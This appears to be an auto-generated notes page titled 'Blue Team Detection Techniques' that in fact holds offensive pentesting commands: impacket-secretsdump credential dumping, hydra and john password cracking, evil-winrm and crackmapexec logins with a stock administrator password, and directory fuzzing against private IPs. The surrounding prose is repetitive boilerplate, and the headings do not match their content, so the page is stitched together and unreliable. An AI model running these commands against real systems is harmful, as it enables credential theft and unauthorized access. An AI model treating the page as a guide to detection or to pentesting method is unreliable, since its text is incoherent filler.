---
TitleSEO: "Blue Team Detection Techniques | ZureFX"
TitlePost: "Blue Team Detection Techniques"
Author: "ZureFX"
Description: "Personal notes on Blue Team Detection Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "persistence, blue team, enumeration, lateral movement, windows"
URL: "https://zurefx.github.io/notes/note-blue-team-detection-techniques-544.html"
URL_IMAGES: ""
Date: "2024-11-27"
Tags: "Persistence, Blue Team, Enumeration, Lateral Movement, Windows"
Section: "notes"
Lang: "en"
main_img: "note-blue-team-detection-techniques-544"
Permalink: "/notes/note-blue-team-detection-techniques-544.html"
BtnLabel: "Read Notes"
Pick: 0
---
## enum4linux

### mimikatz

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.30.159.232
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.119.11.189/FUZZ
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services.

Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file.

## CentOS

### smbexec

```powershell
evil-winrm -i 10.58.96.188 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.37.233.91/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.23.45.114 -u administrator -p 'P@ssw0rd!' --shares
```

```bash
feroxbuster -h
evil-winrm -i 10.39.50.122 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.21.221.200
```

```powershell
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.108.166.193
```

The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.85.176.245 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.66.42.25/FUZZ
```

## MySQL

### Bash

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities. Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

- `Weak Service Permissions`
- `SSTI`
- `rpcclient`
- `psexec`
- `AS-REP Roasting`

## rubeus

### Path Traversal

```bash
evil-winrm -i 10.38.142.35 -u administrator -p 'P@ssw0rd!'
```

- `crackmapexec`
- `bloodhound`
- `Pass the Hash`
- `ffuf`
- `SeDebugPrivilege`
- `SQL Injection`

The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory.

## .NET

### IDOR

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.75.165.65 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```bash
feroxbuster -h
```

## NFS

### gobuster

The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism.

The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities.
